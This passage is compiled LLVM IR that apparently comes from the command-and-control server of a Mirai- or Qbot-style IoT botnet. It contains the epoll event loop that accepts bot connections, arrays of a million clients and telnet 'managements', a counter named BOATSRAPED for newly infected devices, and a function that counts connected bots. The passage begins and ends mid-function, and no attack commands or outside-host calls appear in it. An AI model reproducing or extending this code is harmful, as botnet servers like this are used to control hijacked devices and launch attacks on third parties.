  %48 = call i64 @send(i32 %.pre-phi38, i8* %0, i64 %47, i32 16384) #10
  %49 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv34, i32 2, i64 0
  %50 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0), i8* %49) #10
  %51 = load i32, i32* %37, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %56, label %53

; <label>:53:                                     ; preds = %46
  %54 = call i64 @strlen(i8* nonnull %17) #9
  %55 = call i64 @send(i32 %.pre-phi38, i8* nonnull %17, i64 %54, i32 16384) #10
  br label %58

; <label>:56:                                     ; preds = %46
  %57 = call i64 @send(i32 %.pre-phi38, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i64 1, i32 16384) #10
  br label %58

; <label>:58:                                     ; preds = %40, %53, %56, %.split
  %indvars.iv.next35 = add nuw nsw i64 %indvars.iv34, 1
  %exitcond36 = icmp eq i64 %indvars.iv.next35, 1000000
  br i1 %exitcond36, label %.us-lcssa.us.loopexit43, label %.split

.us-lcssa.us.loopexit:                            ; preds = %31
  br label %.us-lcssa.us

.us-lcssa.us.loopexit43:                          ; preds = %58
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit43, %.us-lcssa.us.loopexit
  call void @free(i8* %10) #10
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #4

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) local_unnamed_addr #4

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @removestr(i8*, i8* nocapture readonly) local_unnamed_addr #0 {
  %3 = tail call i8* @strstr(i8* %0, i8* %1) #9
  %4 = tail call i64 @strlen(i8* %1) #9
  %5 = getelementptr inbounds i8, i8* %3, i64 %4
  %6 = tail call i64 @strlen(i8* %5) #9
  %7 = add i64 %6, 1
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %3, i8* %5, i64 %7, i32 1, i1 false)
  ret void
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @epollEventLoop(i8* nocapture readnone) #6 {
  %2 = alloca %struct.epoll_event, align 4
  %3 = alloca %struct.sockaddr_in, align 2
  %tmpcast = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %4 = alloca i32, align 4
  %5 = alloca [200 x i8], align 16
  %6 = alloca [2048 x i8], align 16
  %7 = tail call noalias i8* @calloc(i64 1000000, i64 12) #10
  %8 = bitcast i8* %7 to %struct.epoll_event*
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %11 = getelementptr inbounds [200 x i8], [200 x i8]* %5, i64 0, i64 0
  %12 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 1
  %13 = bitcast %union.epoll_data* %12 to i32*
  %14 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %16 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 7
  br label %.loopexit.outer

.loopexit.outer.loopexit:                         ; preds = %139
  br label %.loopexit.outer

.loopexit.outer:                                  ; preds = %.loopexit.outer.loopexit, %1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.outer, %.loopexit
  %17 = load volatile i32, i32* @epollFD, align 4
  %18 = call i32 @epoll_wait(i32 %17, %struct.epoll_event* %8, i32 1000000, i32 -1) #10
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %.lr.ph88.preheader, label %.loopexit

.lr.ph88.preheader:                               ; preds = %.loopexit
  %20 = sext i32 %18 to i64
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88.preheader, %139
  %indvars.iv102 = phi i64 [ 0, %.lr.ph88.preheader ], [ %indvars.iv.next103, %139 ]
  %21 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i64 %indvars.iv102, i32 0
  %22 = load i32, i32* %21, align 1
  %23 = and i32 %22, 25
  %24 = icmp eq i32 %23, 1
  br i1 %24, label %32, label %25

; <label>:25:                                     ; preds = %.lr.ph88
  %26 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i64 %indvars.iv102, i32 1
  %27 = bitcast %union.epoll_data* %26 to i32*
  %28 = load i32, i32* %27, align 1
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %29, i32 3
  store i8 0, i8* %30, align 1
  %31 = call i32 @close(i32 %28) #10
  br label %139

; <label>:32:                                     ; preds = %.lr.ph88
  %33 = load volatile i32, i32* @listenFD, align 4
  %34 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i64 %indvars.iv102, i32 1
  %35 = bitcast %union.epoll_data* %34 to i32*
  %36 = load i32, i32* %35, align 1
  %37 = icmp eq i32 %33, %36
  br i1 %37, label %.preheader64, label %100

.preheader64:                                     ; preds = %32
  store i32 16, i32* %4, align 4
  %38 = load volatile i32, i32* @listenFD, align 4
  %39 = call i32 @accept(i32 %38, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %._crit_edge, label %.lr.ph83.preheader

.lr.ph83.preheader:                               ; preds = %.preheader64
  br label %.lr.ph83

._crit_edge.loopexit:                             ; preds = %.backedge65
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader64
  %41 = tail call i32* @__errno_location() #11
  %42 = load i32, i32* %41, align 4
  %43 = icmp eq i32 %42, 11
  br i1 %43, label %139, label %44

; <label>:44:                                     ; preds = %._crit_edge
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0)) #12
  br label %139

.lr.ph83:                                         ; preds = %.lr.ph83.preheader, %.backedge65
  %45 = phi i32 [ %98, %.backedge65 ], [ %39, %.lr.ph83.preheader ]
  %46 = load i32, i32* %10, align 2
  %47 = sext i32 %45 to i64
  %48 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %47, i32 0
  store i32 %46, i32* %48, align 4
  call void @llvm.memset.p0i8.i64(i8* nonnull %11, i8 0, i64 200, i32 16, i1 false)
  %49 = call i32 @fdgets(i8* nonnull %11, i32 200, i32 %45)
  %50 = call i8* @strstr(i8* nonnull %11, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0)) #9
  %51 = icmp eq i8* %50, null
  br i1 %51, label %.preheader.preheader, label %52

; <label>:52:                                     ; preds = %.lr.ph83
  call void @trim(i8* nonnull %11)
  call void @removestr(i8* nonnull %11, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  %53 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %47, i32 2, i64 0
  %54 = call i8* @strcpy(i8* %53, i8* nonnull %11) #10
  br label %57

; <label>:55:                                     ; preds = %63
  %56 = icmp slt i64 %indvars.iv.next, 40
  br i1 %56, label %57, label %.preheader.preheader.loopexit

; <label>:57:                                     ; preds = %52, %55
  %indvars.iv = phi i64 [ 0, %52 ], [ %indvars.iv.next, %55 ]
  %58 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %indvars.iv, i32 0, i64 0
  %59 = call i32 @strcmp(i8* %58, i8* nonnull %11) #9
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %63

; <label>:61:                                     ; preds = %57
  %62 = call i32 @usleep(i32 40000) #10
  br label %.preheader.preheader

; <label>:63:                                     ; preds = %57
  %64 = call i64 @strlen(i8* %58) #9
  %65 = icmp eq i64 %64, 0
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %65, label %66, label %55

; <label>:66:                                     ; preds = %63
  %67 = call i8* @strcpy(i8* %58, i8* nonnull %11) #10
  br label %.preheader.preheader

.preheader.preheader.loopexit:                    ; preds = %55
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %.preheader.preheader.loopexit, %.lr.ph83, %61, %66
  %68 = zext i32 %45 to i64
  br label %.preheader

.preheader:                                       ; preds = %146, %.preheader.preheader
  %indvars.iv100 = phi i64 [ 0, %.preheader.preheader ], [ %indvars.iv.next101.1, %146 ]
  %69 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv100, i32 3
  %70 = load i8, i8* %69, align 1
  %71 = icmp eq i8 %70, 0
  %72 = icmp eq i64 %indvars.iv100, %68
  %or.cond61 = or i1 %72, %71
  br i1 %or.cond61, label %.preheader.1130, label %73

; <label>:73:                                     ; preds = %.preheader
  %74 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv100, i32 0
  %75 = load i32, i32* %74, align 8
  %76 = load i32, i32* %48, align 4
  %77 = icmp eq i32 %75, %76
  br i1 %77, label %82, label %.preheader.1130

.preheader.1130:                                  ; preds = %.preheader, %73
  %indvars.iv.next101 = or i64 %indvars.iv100, 1
  %78 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next101, i32 3
  %79 = load i8, i8* %78, align 1
  %80 = icmp eq i8 %79, 0
  %81 = icmp eq i64 %indvars.iv.next101, %68
  %or.cond61.1 = or i1 %81, %80
  br i1 %or.cond61.1, label %146, label %141

; <label>:82:                                     ; preds = %141, %73
  %83 = call i64 @send(i32 %45, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0), i64 8, i32 16384) #10
  %84 = call i32 @close(i32 %45) #10
  br label %.backedge65

.critedge62:                                      ; preds = %146
  %85 = call fastcc i32 @make_socket_non_blocking(i32 %45)
  %86 = icmp eq i32 %85, -1
  br i1 %86, label %87, label %89

; <label>:87:                                     ; preds = %.critedge62
  %88 = call i32 @close(i32 %45) #10
  br label %139

; <label>:89:                                     ; preds = %.critedge62
  store i32 %45, i32* %13, align 4
  store i32 -2147483647, i32* %14, align 4
  %90 = load volatile i32, i32* @epollFD, align 4
  %91 = call i32 @epoll_ctl(i32 %90, i32 1, i32 %45, %struct.epoll_event* nonnull %2) #10
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %95

; <label>:93:                                     ; preds = %89
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0)) #12
  %94 = call i32 @close(i32 %45) #10
  br label %139

; <label>:95:                                     ; preds = %89
  %96 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %47, i32 3
  store i8 1, i8* %96, align 1
  br label %.backedge65

.backedge65:                                      ; preds = %95, %82
  store i32 16, i32* %4, align 4
  %97 = load volatile i32, i32* @listenFD, align 4
  %98 = call i32 @accept(i32 %97, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %._crit_edge.loopexit, label %.lr.ph83

; <label>:100:                                    ; preds = %32
  %101 = sext i32 %36 to i64
  %102 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %101, i32 3
  store i8 1, i8* %102, align 1
  br label %103

; <label>:103:                                    ; preds = %.critedge, %100
  %.052 = phi i32 [ 0, %100 ], [ %.153, %.critedge ]
  call void @llvm.memset.p0i8.i64(i8* nonnull %15, i8 0, i64 2048, i32 16, i1 false)
  %104 = call i32 @fdgets(i8* nonnull %9, i32 2048, i32 %36)
  %105 = sext i32 %104 to i64
  %106 = icmp sgt i32 %104, 0
  br i1 %106, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %103
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %107 = phi i64 [ %116, %.backedge ], [ %105, %.lr.ph.preheader ]
  %strchr = call i8* @strchr(i8* nonnull %9, i32 10)
  %108 = icmp eq i8* %strchr, null
  br i1 %108, label %.critedge.loopexit, label %109

; <label>:109:                                    ; preds = %.lr.ph
  call void @trim(i8* nonnull %9)
  %strncmp104 = call i32 @strncmp(i8* nonnull %9, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0), i64 7)
  %cmp105 = icmp eq i32 %strncmp104, 0
  br i1 %cmp105, label %110, label %118

; <label>:110:                                    ; preds = %109
  %111 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %112 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %111, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0), i8* %16)
  %113 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %114 = call i32 @fflush(%struct._IO_FILE* %113)
  br label %.backedge

.backedge:                                        ; preds = %110, %119, %131, %125, %128
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 2048, i32 16, i1 false)
  %115 = call i32 @fdgets(i8* nonnull %9, i32 2048, i32 %36)
  %116 = sext i32 %115 to i64
  %117 = icmp sgt i32 %115, 0
  br i1 %117, label %.lr.ph, label %.critedge.loopexit

; <label>:118:                                    ; preds = %109
  %strncmp = call i32 @strncmp(i8* nonnull %9, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i64 0, i64 0), i64 10)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %119, label %122

; <label>:119:                                    ; preds = %118
  %120 = load volatile i32, i32* @BOATSRAPED, align 4
  %121 = add nsw i32 %120, 1
  store volatile i32 %121, i32* @BOATSRAPED, align 4
  br label %.backedge

; <label>:122:                                    ; preds = %118
  %123 = call i32 @strcmp(i8* nonnull %9, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %124 = icmp eq i32 %123, 0
  br i1 %124, label %125, label %128

; <label>:125:                                    ; preds = %122
  %126 = call i64 @send(i32 %36, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0), i64 5, i32 16384) #10
  %127 = icmp eq i64 %126, -1
  br i1 %127, label %.critedge.loopexit, label %.backedge

; <label>:128:                                    ; preds = %122
  %129 = call i32 @strcmp(i8* nonnull %9, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0)) #9
  %130 = icmp eq i32 %129, 0
  br i1 %130, label %.backedge, label %131

; <label>:131:                                    ; preds = %128
  %132 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i64 0, i64 0), i8* nonnull %9)
  br label %.backedge

.critedge.loopexit:                               ; preds = %125, %.lr.ph, %.backedge
  %.lcssa.ph = phi i64 [ %107, %125 ], [ %107, %.lr.ph ], [ %116, %.backedge ]
  %.153.ph = phi i32 [ 1, %125 ], [ 1, %.lr.ph ], [ %.052, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %103
  %.lcssa = phi i64 [ %105, %103 ], [ %.lcssa.ph, %.critedge.loopexit ]
  %.153 = phi i32 [ %.052, %103 ], [ %.153.ph, %.critedge.loopexit ]
  switch i64 %.lcssa, label %103 [
    i64 -1, label %133
    i64 0, label %.thread.loopexit
  ]

; <label>:133:                                    ; preds = %.critedge
  %134 = tail call i32* @__errno_location() #11
  %135 = load i32, i32* %134, align 4
  %136 = icmp eq i32 %135, 11
  %137 = icmp eq i32 %.153, 0
  %or.cond63 = and i1 %137, %136
  br i1 %or.cond63, label %139, label %.thread

.thread.loopexit:                                 ; preds = %.critedge
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit, %133
  store i8 0, i8* %102, align 1
  %138 = call i32 @close(i32 %36) #10
  br label %139

; <label>:139:                                    ; preds = %133, %.thread, %44, %87, %93, %._crit_edge, %25
  %indvars.iv.next103 = add nuw nsw i64 %indvars.iv102, 1
  %140 = icmp slt i64 %indvars.iv.next103, %20
  br i1 %140, label %.lr.ph88, label %.loopexit.outer.loopexit

; <label>:141:                                    ; preds = %.preheader.1130
  %142 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next101, i32 0
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %48, align 4
  %145 = icmp eq i32 %143, %144
  br i1 %145, label %82, label %146

; <label>:146:                                    ; preds = %141, %.preheader.1130
  %indvars.iv.next101.1 = add nsw i64 %indvars.iv100, 2
  %147 = icmp slt i64 %indvars.iv.next101.1, 1000000
  br i1 %147, label %.preheader, label %.critedge62
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #4

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #3

; Function Attrs: nounwind
declare void @perror(i8* nocapture readonly) local_unnamed_addr #4

declare i32 @usleep(i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @make_socket_non_blocking(i32) unnamed_addr #0 {
  %2 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i32 0) #10
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i64 0, i64 0)) #12
  br label %10

; <label>:5:                                      ; preds = %1
  %6 = or i32 %2, 2048
  %7 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i32 %6) #10
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %10

; <label>:9:                                      ; preds = %5
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i64 0, i64 0)) #12
  br label %10

; <label>:10:                                     ; preds = %5, %9, %4
  %.0 = phi i32 [ -1, %4 ], [ -1, %9 ], [ 0, %5 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fprintf(%struct._IO_FILE* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fflush(%struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #4

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @clientsConnected() local_unnamed_addr #7 {
min.iters.checked:
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next, %vector.body ]
  %vec.phi = phi <4 x i32> [ zeroinitializer, %min.iters.checked ], [ %35, %vector.body ]
  %vec.phi9 = phi <4 x i32> [ zeroinitializer, %min.iters.checked ], [ %36, %vector.body ]
  %0 = or i64 %index, 1
  %1 = or i64 %index, 2
  %2 = or i64 %index, 3
  %3 = or i64 %index, 4
  %4 = or i64 %index, 5
  %5 = or i64 %index, 6
  %6 = or i64 %index, 7
  %7 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %index, i32 3
  %8 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %0, i32 3
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %1, i32 3
  %10 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %2, i32 3
  %11 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %3, i32 3
  %12 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %4, i32 3
  %13 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %5, i32 3
  %14 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %6, i32 3
  %15 = load i8, i8* %7, align 1
  %16 = load i8, i8* %8, align 1
  %17 = load i8, i8* %9, align 1
  %18 = load i8, i8* %10, align 1
  %19 = load i8, i8* %11, align 1
  %20 = load i8, i8* %12, align 1
  %21 = load i8, i8* %13, align 1
  %22 = load i8, i8* %14, align 1
  %23 = insertelement <4 x i8> undef, i8 %15, i32 0
  %24 = insertelement <4 x i8> %23, i8 %16, i32 1
  %25 = insertelement <4 x i8> %24, i8 %17, i32 2
  %26 = insertelement <4 x i8> %25, i8 %18, i32 3
  %27 = insertelement <4 x i8> undef, i8 %19, i32 0
  %28 = insertelement <4 x i8> %27, i8 %20, i32 1
  %29 = insertelement <4 x i8> %28, i8 %21, i32 2
  %30 = insertelement <4 x i8> %29, i8 %22, i32 3
  %31 = icmp ne <4 x i8> %26, zeroinitializer
  %32 = icmp ne <4 x i8> %30, zeroinitializer
  %33 = zext <4 x i1> %31 to <4 x i32>
  %34 = zext <4 x i1> %32 to <4 x i32>
  %35 = add nsw <4 x i32> %33, %vec.phi
  %36 = add nsw <4 x i32> %34, %vec.phi9
  %index.next = add i64 %index, 8
  %37 = icmp eq i64 %index.next, 1000000
  br i1 %37, label %middle.block, label %vector.body, !llvm.loop !12

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <4 x i32> %36, %35
  %rdx.shuf = shufflevector <4 x i32> %bin.rdx, <4 x i32> undef, <4 x i32> <i32 2, i32 3, i32 undef, i32 undef>
  %bin.rdx10 = add <4 x i32> %bin.rdx, %rdx.shuf
  %rdx.shuf11 = shufflevector <4 x i32> %bin.rdx10, <4 x i32> undef, <4 x i32> <i32 1, i32 undef, i32 undef, i32 undef>
  %bin.rdx12 = add <4 x i32> %bin.rdx10, %rdx.shuf11
  %38 = extractelement <4 x i32> %bin.rdx12, i32 0
  ret i32 %38
}

; Function Attrs: noinline nounwind uwtable
define i32 @joinn() local_unnamed_addr #0 {
.preheader.preheader23:
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 0, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 1, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 2, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 3, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 4, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 5, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 6, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 7, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 8, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 9, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 10, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 11, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 12, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 13, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 14, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 15, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 16, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 17, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 18, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 19, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 20, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 21, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 22, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 23, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 24, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 25, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 26, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 27, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 28, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 29, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 30, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 31, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 32, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 33, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 34, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 35, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 36, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 37, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 38, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 39, i32 1), align 4
  br label %.preheader

.preheader:                                       ; preds = %14, %.preheader.preheader23
  %indvars.iv17 = phi i64 [ 0, %.preheader.preheader23 ], [ %indvars.iv.next18, %14 ]
  %0 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv17, i32 2, i64 0
  %1 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv17, i32 3
  br label %2

; <label>:2:                                      ; preds = %13, %.preheader
  %indvars.iv = phi i64 [ 0, %.preheader ], [ %indvars.iv.next, %13 ]
  %3 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %indvars.iv, i32 0, i64 0
  %4 = tail call i32 @strcmp(i8* %0, i8* %3) #9
